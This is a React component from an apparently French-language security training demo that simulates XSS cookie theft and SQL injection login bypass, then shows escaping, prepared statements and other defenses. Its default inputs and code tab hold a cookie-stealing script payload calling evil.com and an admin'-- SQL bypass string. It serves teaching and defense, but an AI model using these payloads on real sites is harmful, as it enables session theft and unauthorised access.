import { useState } from 'react'

type Tab = 'attack' | 'code' | 'defense'

export default function XSSInjectionDemo() {
  const [tab, setTab] = useState<Tab>('attack')
  const [xssInput, setXssInput] = useState('<script>fetch("evil.com?c="+document.cookie)</script>')
  const [sqliInput, setSqliInput] = useState("admin'-- ")
  const [xssResult, setXssResult] = useState<null | string>(null)
  const [sqliResult, setSqliResult] = useState<null | string>(null)
  const [xssSecure, setXssSecure] = useState<null | string>(null)
  const [sqliSecure, setSqliSecure] = useState<null | string>(null)

  const attackXSS = () => {
    if (xssInput.includes('<script>') || xssInput.includes('onerror')) {
      setXssResult(`💀 XSS exécuté ! Le script malveillant a volé le cookie de session : session_id=abc123; role=admin → envoyé à evil.com`)
    } else {
      setXssResult(`Entrée rendue telle quelle dans le DOM (pas de script détecté dans cette simulation)`)
    }
  }

  const attackSQLi = () => {
    if (sqliInput.includes("'") || sqliInput.includes('--') || sqliInput.includes('OR')) {
      setSqliResult(`💀 SQLi réussie ! La requête devient :\nSELECT * FROM users WHERE user='${sqliInput}' AND pwd='x'\n→ Le commentaire -- ignore la vérification du mot de passe → Connexion admin !`)
    } else {
      setSqliResult('Requête normale exécutée.')
    }
  }

  const secureXSS = () => {
    const escaped = xssInput
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
    setXssSecure(`✅ Entrée échappée en HTML entities : ${escaped}\n→ Le script n'est PAS exécuté, il est affiché comme du texte`)
  }

  const secureSQLi = () => {
    setSqliSecure(`✅ Requête préparée : SELECT * FROM users WHERE user=? AND pwd=?\n→ Paramètre bindé : ["${sqliInput}", "x"]\n→ Le ' est traité comme un caractère littéral, pas comme du SQL`)
  }

  return (
    <div className="demo-page">
      <div className="demo-header">
        <div className="vuln-tag">💉 OWASP A03/A01 — CWE-79 / CWE-89</div>
        <h2>XSS & Injection Attacks</h2>
        <p>Les entrées utilisateur non filtrées permettent d'injecter du JavaScript (XSS) pour voler des cookies de session, ou du SQL (SQLi) pour contourner l'authentification — les deux mènent à un <strong>Broken Access Control</strong>.</p>
        <div className="impact-list">
          <span className="impact-badge critical">🔴 CRITIQUE</span>
          <span className="impact-badge high">Vol de session (XSS)</span>
          <span className="impact-badge high">Bypass auth (SQLi)</span>
        </div>
      </div>

      <div className="scenario-box">
        <div className="scenario-title">📋 Scénario</div>
        Un formulaire de commentaire dans MedSecure ne filtre pas les entrées. L'attaquant injecte un <code style={{ fontFamily: 'var(--font-mono)', color: 'var(--red)' }}>&lt;script&gt;</code> qui vole le cookie admin. Ou bien, le formulaire de login est vulnérable au SQLi : <code style={{ fontFamily: 'var(--font-mono)', color: 'var(--red)' }}>admin'--</code> connecte sans mot de passe.
      </div>

      <div className="tabs">
        <button className={`tab-btn ${tab === 'attack' ? 'active' : ''}`} onClick={() => setTab('attack')}>🔴 Démonstration</button>
        <button className={`tab-btn ${tab === 'code' ? 'active' : ''}`} onClick={() => setTab('code')}>💻 Code</button>
        <button className={`tab-btn ${tab === 'defense' ? 'active' : ''}`} onClick={() => setTab('defense')}>🛡️ Défense</button>
      </div>

      {tab === 'attack' && (
        <div className="animate-in">
          <div className="two-col">
            {/* XSS */}
            <div className="card danger">
              <div className="card-title red">🔴 XSS — Steal Session Cookie</div>
              <div className="input-group">
                <label>Commentaire (injection XSS) :</label>
                <input className="input-field danger" value={xssInput} onChange={e => setXssInput(e.target.value)} />
              </div>
              <button className="btn btn-red attack-btn" onClick={attackXSS}>🚨 Poster le commentaire</button>
              {xssResult && (
                <div className="result-box error" style={{ marginTop: '12px', whiteSpace: 'pre-wrap' }}>{xssResult}</div>
              )}
              <div style={{ marginTop: '14px', borderTop: '1px solid var(--border)', paddingTop: '14px' }}>
                <div className="card-title green" style={{ fontSize: '13px' }}>🛡️ Avec échappement HTML</div>
                <button className="btn btn-green" onClick={secureXSS} style={{ marginTop: '8px' }}>🛡️ Poster (sécurisé)</button>
                {xssSecure && (
                  <div className="result-box success" style={{ marginTop: '12px', whiteSpace: 'pre-wrap', fontSize: '11px' }}>{xssSecure}</div>
                )}
              </div>
            </div>

            {/* SQLi */}
            <div className="card danger">
              <div className="card-title red">🔴 SQLi — Bypass Login</div>
              <div className="input-group">
                <label>Nom d'utilisateur (injection SQL) :</label>
                <input className="input-field danger" value={sqliInput} onChange={e => setSqliInput(e.target.value)} />
              </div>
              <button className="btn btn-red attack-btn" onClick={attackSQLi}>🚨 Se connecter</button>
              {sqliResult && (
                <div className="result-box error" style={{ marginTop: '12px', whiteSpace: 'pre-wrap', fontSize: '11px' }}>{sqliResult}</div>
              )}
              <div style={{ marginTop: '14px', borderTop: '1px solid var(--border)', paddingTop: '14px' }}>
                <div className="card-title green" style={{ fontSize: '13px' }}>🛡️ Avec requêtes préparées</div>
                <button className="btn btn-green" onClick={secureSQLi} style={{ marginTop: '8px' }}>🛡️ Connexion (sécurisé)</button>
                {sqliSecure && (
                  <div className="result-box success" style={{ marginTop: '12px', whiteSpace: 'pre-wrap', fontSize: '11px' }}>{sqliSecure}</div>
                )}
              </div>
            </div>
          </div>
        </div>
      )}

      {tab === 'code' && (
        <div className="animate-in two-col">
          <div className="card danger">
            <div className="card-title red">❌ XSS + SQLi Vulnérable</div>
            <div className="code-block">
              <span className="line-bad"><span className="cmt">// ❌ XSS — insertion directe dans le DOM</span></span>
              <span className="line-bad">{`<`}input value=<span className="str">""</span>{`>`}</span>
              <span className="line-bad">{`<`}script{`>`}fetch(<span className="str">'evil.com?c='</span></span>
              <span className="line-bad">  +document.cookie){`<`}/script{`>`}</span>
              <span className="line-normal"></span>
              <span className="line-bad"><span className="cmt">// ❌ SQLi — concaténation de chaîne</span></span>
              <span className="line-bad">SELECT * FROM users</span>
              <span className="line-bad">WHERE user=<span className="str">'admin'--'</span></span>
              <span className="line-bad">AND pwd=<span className="str">'x'</span></span>
              <span className="line-bad"><span className="cmt">// -- commente le reste → bypass !</span></span>
            </div>
          </div>
          <div className="card success">
            <div className="card-title green">✅ XSS + SQLi Sécurisé</div>
            <div className="code-block">
              <span className="line-good"><span className="cmt">// ✅ XSS — échapper les entités HTML</span></span>
              <span className="line-good"><span className="kw">const</span> safe = DOMPurify.<span className="fn">sanitize</span>(input);</span>
              <span className="line-good"><span className="cmt">// OU utiliser React (échappe par défaut)</span></span>
              <span className="line-good">{`<`}p{`>`}{'{'}userComment{'}'}{`<`}/p{`>`}</span>
              <span className="line-normal"></span>
              <span className="line-good"><span className="cmt">// ✅ SQLi — requêtes préparées</span></span>
              <span className="line-good">PreparedStatement stmt =</span>
              <span className="line-good">  conn.<span className="fn">prepareStatement</span>(</span>
              <span className="line-good">    <span className="str">"SELECT * FROM users WHERE user=? AND pwd=?"</span>);</span>
              <span className="line-good">stmt.<span className="fn">setString</span>(<span className="num">1</span>, user);</span>
              <span className="line-good">stmt.<span className="fn">setString</span>(<span className="num">2</span>, pwd);</span>
            </div>
          </div>
        </div>
      )}

      {tab === 'defense' && (
        <div className="animate-in card success">
          <div className="card-title green">🛡️ Défenses contre XSS & Injection</div>
          <ul className="defense-list">
            <li><strong>Échapper les sorties :</strong> Utiliser DOMPurify, ou laisser React/Angular échapper automatiquement. Ne jamais utiliser dangerouslySetInnerHTML.</li>
            <li><strong>Requêtes préparées :</strong> Utiliser des PreparedStatement (Java), parameterized queries (Node.js), ou un ORM (Hibernate, Prisma).</li>
            <li><strong>Content Security Policy (CSP) :</strong> Header HTTP qui empêche l'exécution de scripts inline.</li>
            <li><strong>Cookies HttpOnly :</strong> Le JavaScript ne peut pas lire les cookies marqués HttpOnly → XSS ne peut pas voler la session.</li>
            <li><strong>Validation d'entrée :</strong> Whitelister les caractères autorisés, rejeter les patterns suspects.</li>
            <li><strong>WAF (Web Application Firewall) :</strong> Filtrer les payloads XSS et SQLi au niveau réseau.</li>
          </ul>
        </div>
      )}
    </div>
  )
}
